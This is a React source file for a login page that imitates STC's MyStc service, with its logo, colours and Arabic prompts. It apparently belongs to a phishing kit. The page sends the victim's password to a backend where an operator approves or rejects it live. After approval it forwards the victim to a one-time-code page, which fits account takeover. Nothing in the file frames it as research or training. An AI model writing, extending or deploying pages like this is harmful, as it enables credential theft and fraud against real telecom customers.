import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";
import { Lock } from "lucide-react";

const schema = z.object({
  password: z.string()
    .min(1, "كلمة المرور مطلوبة")
    .regex(/^[a-zA-Z0-9]+$/, "كلمة المرور يجب أن تحتوي على أرقام وحروف إنجليزية فقط"),
});

type FormData = z.infer<typeof schema>;

export default function STCPassword() {
  const [, navigate] = useLocation();
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const {
    register,
    handleSubmit,
    reset,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      password: "",
    },
  });

  const password = watch("password");
  const isPasswordValid = password && password.length > 0;

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور STC");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/mystc-otp");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      setErrorMessage("كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى");
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    setErrorMessage("");
    sendData({
      data: {
        "كلمة مرور STC": data.password,
      },
      current: "كلمة مرور STC",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري التحقق من كلمة المرور",
    });
  };

  return (
    <PageLayout variant="default" className="bg-white min-h-screen">
      <WaitingOverlay />

      <div className="px-6 py-8 flex flex-col min-h-screen">
        {/* STC Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src="/images/service-providers/stc-logo.png" 
            alt="STC" 
            className="h-10 w-auto"
          />
        </div>

        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-xl font-bold text-gray-800 mb-2">أدخل كلمة المرور</h1>
          <p className="text-sm">
            <span style={{ color: '#00A651' }}>يتعين عليك ادخال كلمة الجديدة من </span>
            <span style={{ color: '#4F008C' }}>Mystc</span>
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
          {/* Password Field */}
          <div className="flex items-center border border-gray-200 rounded-lg px-4 py-3 bg-white">
            {/* Left side - Lock icon */}
            <Lock className="w-5 h-5 text-gray-400" />
            
            {/* Input Field */}
            <input
              id="password"
              type={showPassword ? "text" : "password"}
              placeholder="كلمة المرور"
              className="flex-1 bg-transparent text-right outline-none mx-3 text-base placeholder-gray-400"
              dir="ltr"
              onInput={(e) => {
                const input = e.target as HTMLInputElement;
                input.value = input.value.replace(/[^a-zA-Z0-9]/g, '');
              }}
              {...register("password")}
            />
            
            {/* Right side - Show/Hide button */}
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="text-sm font-medium"
              style={{ color: '#4F008C' }}
            >
              {showPassword ? "إخفاء" : "اظهار"}
            </button>
          </div>
          <div>
            
            {errors.password && (
              <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
            )}
            {errorMessage && (
              <p className="text-red-500 text-xs text-right">{errorMessage}</p>
            )}
          </div>

          {/* Spacer */}
          <div className="flex-1"></div>

          {/* Submit Button - Fixed at bottom */}
          <div className="pb-12 pt-2">
            <Button 
              type="submit" 
              disabled={!isPasswordValid}
              className="w-full h-12 text-base font-medium rounded-lg transition-colors"
              style={{ 
                backgroundColor: isPasswordValid ? '#4F008C' : '#E5E5E5', 
                color: isPasswordValid ? '#FFFFFF' : '#666666' 
              }}
            >
              تسجيل الدخول
            </Button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
